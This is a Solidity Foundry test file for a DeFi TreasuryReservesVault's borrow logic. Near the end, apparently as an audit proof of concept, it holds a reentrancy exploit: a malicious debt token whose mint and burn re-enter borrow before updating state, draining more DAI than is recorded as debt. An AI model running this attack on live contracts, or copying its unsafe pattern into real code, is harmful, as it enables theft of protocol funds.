pragma solidity 0.8.20;
// SPDX-License-Identifier: AGPL-3.0-or-later

import {TreasuryReservesVault, ITreasuryReservesVault} from 'contracts/v2/TreasuryReservesVault.sol';
import {MockBaseStrategy} from '../strategies/MockBaseStrategy.t.sol';
import {CommonEventsAndErrors} from 'contracts/common/CommonEventsAndErrors.sol';
import {ITempleStrategy} from 'contracts/interfaces/v2/strategies/ITempleStrategy.sol';
import {TreasuryReservesVaultTestBase} from './TrvBase.t.sol';
import {stdError} from 'forge-std/StdError.sol';
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {ITempleDebtToken} from 'contracts/interfaces/v2/ITempleDebtToken.sol';
import {ITempleElevatedAccess} from 'contracts/interfaces/v2/access/ITempleElevatedAccess.sol';
import {console} from 'forge-std/console.sol';
import {Vm} from 'forge-std/Vm.sol';

/* solhint-disable func-name-mixedcase, contract-name-camelcase, not-rely-on-time */
contract TreasuryReservesVaultTestBorrow is TreasuryReservesVaultTestBase {
  event Borrow(
    address indexed strategy,
    address indexed token,
    address indexed recipient,
    uint256 amount
  );
  event StrategyCreditAndDebtBalance(
    address indexed strategy,
    address indexed token,
    uint256 credit,
    uint256 debt
  );

  uint256 internal constant DAI_CEILING = 333e18;
  uint256 internal constant TEMPLE_CEILING = 66e18;
  uint256 internal constant WETH_CEILING = 99e18;

  function setUp() public {
    _setUp();
  }

  function test_borrow_reverts() public {
    // Borrow token needs to exist
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrow(dai, 123, alice);

      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 100, 101, address(dUSD));
    }

    // Strategy needs to exist
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.StrategyNotEnabled.selector
        )
      );
      trv.borrow(dai, 123, alice);

      vm.startPrank(executor);
      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 5e18);
      trv.addStrategy(address(strategy), 100, debtCeiling);
    }

    assertEq(trv.availableForStrategyToBorrow(address(strategy), dai), 5e18);

    // Too much
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.DebtCeilingBreached.selector,
          5e18,
          5.01e18
        )
      );
      trv.borrow(dai, 5.01e18, alice);
    }

    // 0 amount
    {
      vm.expectRevert(
        abi.encodeWithSelector(CommonEventsAndErrors.ExpectedNonZero.selector)
      );
      trv.borrow(dai, 0, alice);
    }

    // Global paused
    {
      vm.startPrank(executor);
      trv.setGlobalPaused(true, false);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(ITreasuryReservesVault.BorrowPaused.selector)
      );
      trv.borrow(dai, 5.0e18, alice);

      vm.startPrank(executor);
      trv.setGlobalPaused(false, false);
    }

    // Strategy paused
    {
      trv.setStrategyPaused(address(strategy), true, false);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(ITreasuryReservesVault.BorrowPaused.selector)
      );
      trv.borrow(dai, 5.0e18, alice);

      vm.startPrank(executor);
      trv.setStrategyPaused(address(strategy), false, false);
    }

    // Is shutting down
    {
      trv.setStrategyIsShuttingDown(address(strategy), true);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.StrategyIsShutdown.selector
        )
      );
      trv.borrow(dai, 5.0e18, alice);

      vm.startPrank(executor);
      trv.setStrategyIsShuttingDown(address(strategy), false);
    }

    // TRV not funded with DAI
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          CommonEventsAndErrors.InsufficientBalance.selector,
          address(dai),
          5.0e18,
          0
        )
      );

      trv.borrow(dai, 5.0e18, alice);

      deal(address(dai), address(trv), 1_000e18, true);
    }

    // Success
    vm.expectEmit(address(trv));
    emit Borrow(address(strategy), address(dai), alice, 5e18);
    trv.borrow(dai, 5e18, alice);

    // DAI transferred to alice, dUSD minted to strategy.
    assertEq(dai.balanceOf(alice), 5e18);
    assertEq(dUSD.balanceOf(address(strategy)), 5e18);

    // disable the borrow token and it should now revert
    {
      vm.startPrank(executor);
      IERC20[] memory disableBorrowTokens = new IERC20[](1);
      disableBorrowTokens[0] = dai;
      trv.updateStrategyEnabledBorrowTokens(
        address(strategy),
        new IERC20[](0),
        disableBorrowTokens
      );

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrow(dai, 5e18, alice);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrowMax(dai, alice);
    }
  }

  function test_borrow_fromCredits() public {
    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 1_000e18, 2_000e18, address(dUSD));
      deal(address(dai), address(trv), 1_000e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(strategy), -123, debtCeiling);
    }

    // Do a repay such that there's a credit balance.
    {
      deal(address(dai), address(alice), 3e18, true);
      vm.startPrank(alice);
      dai.approve(address(trv), 3e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        3e18,
        0
      );

      trv.repay(dai, 3e18, address(strategy));
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 3e18);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING + 3e18
      );

      assertEq(dai.balanceOf(alice), 0);
      assertEq(dUSD.balanceOf(address(strategy)), 0);
    }

    // Taken from credits (still some left)
    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 2e18);
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        1e18,
        0
      );

      trv.borrow(dai, 2e18, alice);
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 1e18);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING + 1e18
      );

      assertEq(dai.balanceOf(alice), 2e18);
      assertEq(dUSD.balanceOf(address(strategy)), 0);
    }

    // Taken from credits and issue debt
    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        4e18
      );

      trv.borrow(dai, 5e18, alice);
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 4e18
      );

      assertEq(dai.balanceOf(alice), 7e18);
      assertEq(dUSD.balanceOf(address(strategy)), 4e18);
    }
  }

  function test_borrow_withBaseStrategy_noSelfBorrow() public {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 0.75e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );
      deal(address(dai), address(baseStrategy), 1_000e18, true);
      deal(address(dai), address(trv), 1_000e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
    }

    // If done as the strategy then it just pulls straight from TRV
    // (doesn't pull from itself again)
    {
      vm.startPrank(address(baseStrategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(baseStrategy), address(dai), alice, 5e18);
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(baseStrategy),
        address(dai),
        0,
        5e18
      );

      trv.borrow(dai, 5e18, alice);
      assertEq(trv.strategyTokenCredits(address(baseStrategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(baseStrategy), dai),
        DAI_CEILING - 5e18
      );

      assertEq(dai.balanceOf(alice), 5e18);
      assertEq(dUSD.balanceOf(address(baseStrategy)), 5e18);
    }
  }

  function test_borrow_withBaseStrategy_noBaseStrategy() public {
    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 0.75e18, 3 * 0.75e18, address(dUSD));
      deal(address(dai), address(trv), 1_000e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(strategy), -123, debtCeiling);
    }

    // Pulled straight from the TRV as there's no base strategy set
    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      assertEq(dai.balanceOf(address(trv)), 1_000e18 - 5e18);
      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 5e18);

      assertEq(dUSD.balanceOf(address(strategy)), 5e18);
    }
  }

  function test_borrow_withBaseStrategy_allTrvBalance_outstandingBaseStrategyDebt()
    public
  {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 0;
    uint256 baseStrategyFunding = 200e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );

      deal(address(dai), address(trv), baseStrategyFunding + 2e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
      trv.addStrategy(address(strategy), -123, debtCeiling);

      // The base strategy now has a dUSD debt of 200e18
      baseStrategy.borrowAndDeposit(150e18);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      // 2 was taken from the TRV which started at 52 (200-150+2)
      assertEq(dai.balanceOf(address(trv)), 50e18 + 2e18 - 5e18);
      // Nothing was taken out of the base strategy
      assertEq(dai.balanceOf(address(baseStrategy)), 150e18);

      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 5e18);

      assertEq(dUSD.balanceOf(address(strategy)), 5e18);
      assertEq(trv.strategyTokenCredits(address(baseStrategy), dai), 0);
      assertEq(dUSD.balanceOf(address(baseStrategy)), 150e18);
    }
  }

  function test_borrow_withBaseStrategy_useTrvBalanceFirst_outstandingBaseStrategyDebt()
    public
  {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 0;
    uint256 baseStrategyFunding = 200e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );

      deal(address(dai), address(trv), baseStrategyFunding + 2e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
      trv.addStrategy(address(strategy), -123, debtCeiling);

      // The base strategy now has a dUSD debt of 200e18
      baseStrategy.borrowAndDeposit(baseStrategyFunding);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      // The base strategy had a repayment of (5-2)
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(baseStrategy),
        address(dai),
        0,
        baseStrategyFunding - 5e18 + 2e18
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      // 2 was taken from the TRV -- now empty
      assertEq(dai.balanceOf(address(trv)), 0);
      // only 3 was taken out of the base strategy
      assertEq(
        dai.balanceOf(address(baseStrategy)),
        baseStrategyFunding - 5e18 + 2e18
      );

      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 5e18);

      assertEq(dUSD.balanceOf(address(strategy)), 5e18);
      assertEq(trv.strategyTokenCredits(address(baseStrategy), dai), 0);
      assertEq(
        dUSD.balanceOf(address(baseStrategy)),
        baseStrategyFunding - 5e18 + 2e18
      );
    }
  }

  function test_borrow_withBaseStrategy_trvWithdraw_someBuffer_baseStrategyDebtRepaid()
    public
  {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 7.75e18;
    uint256 baseStrategyFunding = 1.123e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );

      deal(address(dai), address(baseStrategy), 1_000e18, true);
      deal(address(dai), address(trv), 0.5e18 + baseStrategyFunding, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
      trv.addStrategy(address(strategy), -123, debtCeiling);

      // The base strategy now has a dUSD debt of 1.123e18
      baseStrategy.borrowAndDeposit(baseStrategyFunding);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      // The TRV started with 0.5 + 1.123 DAI.
      // The base strategy borrowed and deposited 1.123 of this (so a dUSD of 1.123)
      // The new borrow of 5 meant:
      //     1.623 directly from TRV
      //     (7.75+5-1.623 = 11.127) was pulled from the base strategy (so the buffer was back to 7.75)
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(baseStrategy),
        address(dai),
        5e18 + bufferThreshold - 0.5e18 - baseStrategyFunding,
        0
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      // The TRV now has exactly the threshold of DAI.
      assertEq(dai.balanceOf(address(trv)), bufferThreshold, 'trv');
      // The threshold amount (7.75e18) plus anything not covered by the TRV initially was taken out of the base strategy
      assertEq(
        dai.balanceOf(address(baseStrategy)),
        1_000e18 - (bufferThreshold + 5e18 - baseStrategyFunding - 0.5e18),
        'baseStrategy'
      );

      assertEq(dai.balanceOf(address(strategy)), 0, 'strategy');
      assertEq(dai.balanceOf(alice), 5e18, 'alice');

      assertEq(dUSD.balanceOf(address(strategy)), 5e18, 'dusd');
      assertEq(
        trv.strategyTokenCredits(address(baseStrategy), dai),
        5e18 + bufferThreshold - 0.5e18 - baseStrategyFunding
      );
      assertEq(dUSD.balanceOf(address(baseStrategy)), 0, 'dusd');
    }
  }

  function test_borrowMax() public {
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrowMax(dai, alice);

      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 0, 0, address(dUSD));
      deal(address(dai), address(trv), 120e18, true);
    }

    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.StrategyNotEnabled.selector
        )
      );
      trv.borrowMax(dai, alice);

      vm.startPrank(executor);
      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 50e18);
      trv.addStrategy(address(strategy), -123, debtCeiling);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 50e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        50e18
      );

      trv.borrowMax(dai, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(trv.availableForStrategyToBorrow(address(strategy), dai), 0);

      assertEq(dai.balanceOf(address(trv)), 70e18);

      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 50e18);

      assertEq(dUSD.balanceOf(address(strategy)), 50e18);
    }
  }

  function test_borrow_baseStrategyWithdraw_NoDebtTokens() public {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 debtCeiling = 100e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(baseStrategy), 0, 0, address(dUSD));

      ITempleStrategy.AssetBalance[]
        memory debtCeilingArr = new ITempleStrategy.AssetBalance[](1);
      debtCeilingArr[0] = ITempleStrategy.AssetBalance(
        address(dai),
        debtCeiling
      );
      trv.addStrategy(address(baseStrategy), 0, debtCeilingArr);
      trv.addStrategy(address(strategy), 0, debtCeilingArr);
    }

    // The base strategy and TRV has no DAI, so it reverts.
    vm.expectRevert(
      abi.encodeWithSelector(
        CommonEventsAndErrors.InsufficientBalance.selector,
        address(dai),
        50e18,
        0
      )
    );
    strategy.borrow(dai, 50e18);
  }

  function test_borrow_baseStrategyOverflow() public {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 debtCeiling = type(uint256).max - 10e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(baseStrategy), 0, 0, address(dUSD));

      deal(address(dai), address(baseStrategy), 100e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeilingArr = new ITempleStrategy.AssetBalance[](1);
      debtCeilingArr[0] = ITempleStrategy.AssetBalance(
        address(dai),
        debtCeiling
      );
      trv.addStrategy(address(baseStrategy), 0, debtCeilingArr);
      trv.addStrategy(address(strategy), 0, debtCeilingArr);
    }

    // Base strategy repays 100 DAI such that it now has a credit.
    // The 10e18 is now in the TRV
    deal(address(dai), executor, 10e18, true);
    dai.approve(address(trv), 10e18);
    trv.repay(dai, 10e18, address(baseStrategy));

    uint256 available = trv.availableForStrategyToBorrow(
      address(strategy),
      dai
    );
    assertEq(available, debtCeiling);

    uint256 availableBase = trv.availableForStrategyToBorrow(
      address(baseStrategy),
      dai
    );
    assertEq(availableBase, debtCeiling + 10e18);

    // The strategy can borrow up to 10 DAI
    strategy.borrow(dai, 10e18);

    available = trv.availableForStrategyToBorrow(address(strategy), dai);
    assertEq(available, debtCeiling - 10e18);

    // The available amount for the base strategy is still the same
    // because no new DAI was borrowed/repaid - it was pulled straight from the TRV.
    availableBase = trv.availableForStrategyToBorrow(
      address(baseStrategy),
      dai
    );
    assertEq(availableBase, debtCeiling + 10e18);

    // Any more borrowed, and the base strategy total ceiling+credit overflows.
    // It can't have a total credit > uint256.max
    vm.expectRevert(stdError.arithmeticError);
    strategy.borrow(dai, 1);
  }
}

/**
 * @title Malicious Debt Token
 * @notice Contract that implements ITempleDebtToken to demonstrate the
 * reentrancy vulnerability in TreasuryReservesVault
 */
abstract contract MaliciousDebtToken is ITempleDebtToken {
  // Simple event to signal when reentrancy should be executed
  event ReentrancyOpportunity(address strategy, uint256 amount);

  // Basic token tracking
  mapping(address => uint256) public balances;
  uint256 private _totalSupply;

  // Attack control flags
  bool public attackActive = false;
  address public attackStrategy;
  uint256 public attackAmount;
  address public attackExploit;

  function setAttackParameters(
    bool _active,
    address _strategy,
    address _exploit,
    uint256 _amount
  ) external {
    attackActive = _active;
    attackStrategy = _strategy;
    attackExploit = _exploit;
    attackAmount = _amount;
  }

  // This is the vulnerable function that can be exploited
  function mint(address _debtor, uint256 _mintAmount) external override {
    // If attack is active, emit event BEFORE updating state
    if (attackActive && _debtor == attackStrategy) {
      // Llamamos directamente al contrato exploit para la reentrancia
      // Esto ocurre antes de que el estado de balances sea actualizado
      ExploitStrategy(attackExploit).exploit(attackAmount);
    }

    // Normal functionality - update balances after potential reentrancy
    balances[_debtor] += _mintAmount;
    _totalSupply += _mintAmount;

    // Standard event
    emit Transfer(address(0), _debtor, _mintAmount);
  }

  // This function can also be exploited
  function burn(
    address _debtor,
    uint256 _burnAmount
  ) external override returns (uint256) {
    uint256 actualBurnAmount = _burnAmount;
    if (actualBurnAmount > balances[_debtor]) {
      actualBurnAmount = balances[_debtor];
    }

    // If attack is active, emit event BEFORE updating state
    if (attackActive && _debtor == attackStrategy) {
      // Llamamos directamente al contrato exploit para la reentrancia
      // Esto ocurre antes de que el estado de balances sea actualizado
      ExploitStrategy(attackExploit).exploit(attackAmount);
    }

    // Update state after potential reentrancy
    balances[_debtor] -= actualBurnAmount;
    _totalSupply -= actualBurnAmount;

    // Standard event
    emit Transfer(_debtor, address(0), actualBurnAmount);

    return actualBurnAmount;
  }

  function burnAll(address _debtor) external override returns (uint256) {
    uint256 amount = balances[_debtor];
    if (amount > 0) {
      balances[_debtor] = 0;
      _totalSupply -= amount;
      emit Transfer(_debtor, address(0), amount);
    }
    return amount;
  }

  // Basic ERC20 functions
  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return balances[account];
  }

  function transfer(address, uint256) external pure override returns (bool) {
    revert NonTransferrable();
  }

  function allowance(
    address,
    address
  ) external pure override returns (uint256) {
    return 0;
  }

  function approve(address, uint256) external pure override returns (bool) {
    revert NonTransferrable();
  }

  function transferFrom(
    address,
    address,
    uint256
  ) external pure override returns (bool) {
    revert NonTransferrable();
  }

  // ITempleDebtToken basic implementations
  function name() external pure override returns (string memory) {
    return 'Malicious Debt Token';
  }

  function symbol() external pure override returns (string memory) {
    return 'HACK';
  }

  function decimals() external pure override returns (uint8) {
    return 18;
  }

  function version() external pure override returns (string memory) {
    return '1.0.0';
  }

  // Stub implementations for ITempleDebtToken interface
  function baseRate() external pure override returns (uint96) {
    return 0;
  }
  function baseCheckpointTime() external pure override returns (uint32) {
    return 0;
  }
  function baseCheckpoint() external pure override returns (uint128) {
    return 0;
  }
  function baseShares() external pure override returns (uint128) {
    return 0;
  }
  function totalPrincipal() external pure override returns (uint128) {
    return 0;
  }
  function estimatedTotalRiskPremiumInterest()
    external
    pure
    override
    returns (uint128)
  {
    return 0;
  }
  function debtors(
    address
  ) external pure override returns (uint128, uint128, uint96, uint128, uint32) {
    return (0, 0, 0, 0, 0);
  }
  function minters(address) external pure override returns (bool) {
    return true;
  }
  function addMinter(address) external override {}
  function removeMinter(address) external override {}
  function setBaseInterestRate(uint96) external override {}
  function setRiskPremiumInterestRate(address, uint96) external override {}
  function checkpointBaseInterest() external override returns (uint256) {
    return 0;
  }
  function checkpointDebtorInterest(
    address
  ) external override returns (uint256) {
    return 0;
  }
  function checkpointDebtorsInterest(address[] calldata) external override {}
  function currentDebtOf(
    address
  ) external pure override returns (DebtOwed memory) {
    return DebtOwed(0, 0, 0);
  }
  function currentDebtsOf(
    address[] calldata
  ) external pure override returns (DebtOwed[] memory) {
    return new DebtOwed[](0);
  }
  function currentTotalDebt() external pure override returns (DebtOwed memory) {
    return DebtOwed(0, 0, 0);
  }
  function baseDebtToShares(uint128) external pure override returns (uint128) {
    return 0;
  }
  function baseSharesToDebt(uint128) external pure override returns (uint128) {
    return 0;
  }

  // ITempleElevatedAccess stubs - simplificado para evitar el error
  function isElevatedAccess(address, bytes4) external pure returns (bool) {
    return true;
  }
  function rescuer() external pure returns (address) {
    return address(0);
  }
  function executor() external pure returns (address) {
    return address(0);
  }
  function explicitFunctionAccess(
    address,
    bytes4
  ) external pure returns (bool) {
    return true;
  }
  function inRescueMode() external pure returns (bool) {
    return false;
  }
  function setRescueMode(bool) external {}
  function proposeNewRescuer(address) external {}
  function acceptRescuer() external {}
  function proposeNewExecutor(address) external {}
  function acceptExecutor() external {}
}

/**
 * @title Concrete implementation of MaliciousDebtToken
 */
contract SimpleMaliciousDebtToken is MaliciousDebtToken {
  // Implement any missing interface methods here
  function setExplicitAccess(
    address,
    ITempleElevatedAccess.ExplicitAccess[] calldata
  ) external override {}
}

/**
 * @title Simple strategy contract to exploit reentrancy
 */
contract ExploitStrategy is MockBaseStrategy {
  constructor(
    address _rescuer,
    address _executor,
    string memory _name,
    address _trv,
    address _token
  ) MockBaseStrategy(_rescuer, _executor, _name, _trv, _token) {}

  // Function to exploit reentrancy
  function exploit(uint256 amount) external {
    treasuryReservesVault.borrow(token, amount, msg.sender);
  }
}

/**
 * @title TreasuryReservesVault Reentrancy Test
 */
contract TreasuryReservesVaultReentrancyTest is TreasuryReservesVaultTestBase {
  MaliciousDebtToken public maliciousDToken;
  ExploitStrategy public exploitStrategy;

  function setUp() public {
    _setUp();

    // Create malicious debt token
    maliciousDToken = new SimpleMaliciousDebtToken();

    // Create exploit strategy
    exploitStrategy = new ExploitStrategy(
      rescuer,
      executor,
      'ExploitStrategy',
      address(trv),
      address(dai)
    );

    // Setup TRV with malicious debt token
    vm.startPrank(executor);
    trv.setBorrowToken(dai, address(0), 0, 0, address(maliciousDToken));

    // Add strategy to TRV
    ITempleStrategy.AssetBalance[]
      memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
    debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 100e18);
    trv.addStrategy(address(exploitStrategy), 0, debtCeiling);

    vm.stopPrank();

    // Fund TRV with DAI
    deal(address(dai), address(trv), 1000e18, true);
  }

  function test_reentrancy_mintDToken() public {
    // Setup attack parameters - atacar directamente sin necesidad de capturar eventos
    maliciousDToken.setAttackParameters(
      true,
      address(exploitStrategy),
      address(exploitStrategy),
      50e18
    );

    // Verificamos que el balance inicial es cero
    assertEq(dai.balanceOf(address(this)), 0, 'Initial balance should be 0');

    // Ejecutamos el primer borrowing que debería activar la reentrancia
    vm.prank(address(exploitStrategy));
    trv.borrow(dai, 50e18, address(this));

    // Verificamos el resultado después del ataque de reentrancia
    // Deberíamos haber obtenido más DAI que el debtToken registrado
    emit log_named_uint('Final DAI balance', dai.balanceOf(address(this)));
    emit log_named_uint(
      'Debt token balance',
      maliciousDToken.balanceOf(address(exploitStrategy))
    );

    // Si la vulnerabilidad existe, nuestro balance de DAI debería ser mayor que la deuda registrada
    assertGt(
      dai.balanceOf(address(this)),
      50e18,
      'Should have borrowed more than initial amount'
    );

    // La vulnerabilidad hace que hayamos prestado más de lo que se registra como deuda
    assertGt(
      dai.balanceOf(address(this)),
      maliciousDToken.balanceOf(address(exploitStrategy)),
      'DAI balance should be greater than debt token balance due to reentrancy'
    );
  }

  function test_reentrancy_burnDToken() public {
    // First create some credits for our strategy
    deal(address(dai), address(this), 20e18, true);
    dai.approve(address(trv), 20e18);
    trv.repay(dai, 20e18, address(exploitStrategy));

    // Verify credits were created
    assertEq(
      trv.strategyTokenCredits(address(exploitStrategy), dai),
      20e18,
      'Should have 20e18 credits'
    );

    // Setup attack parameters
    maliciousDToken.setAttackParameters(
      true,
      address(exploitStrategy),
      address(exploitStrategy),
      30e18
    );

    // Start the attack by borrowing (which will burn credits first)
    vm.prank(address(exploitStrategy));
    trv.borrow(dai, 20e18, address(this));

    // Verify results - should have borrowed more than our credits
    emit log_named_uint('Final DAI balance', dai.balanceOf(address(this)));
    emit log_named_uint(
      'Final strategy credits',
      trv.strategyTokenCredits(address(exploitStrategy), dai)
    );
    emit log_named_uint(
      'Final dToken balance',
      maliciousDToken.balanceOf(address(exploitStrategy))
    );

    // Si la vulnerabilidad existe, deberíamos obtener más DAI que nuestra cantidad inicial de créditos
    assertGt(
      dai.balanceOf(address(this)),
      20e18,
      'Should have borrowed more than initial amount'
    );
  }
}
